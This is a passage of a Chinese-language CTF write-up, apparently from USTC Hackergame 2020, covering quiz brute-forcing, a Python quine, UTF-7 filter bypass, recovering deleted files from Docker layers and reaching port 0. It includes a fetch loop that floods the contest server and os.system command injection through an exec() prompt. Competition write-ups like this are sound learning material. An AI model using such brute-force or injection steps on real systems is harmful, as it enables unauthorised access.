9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span 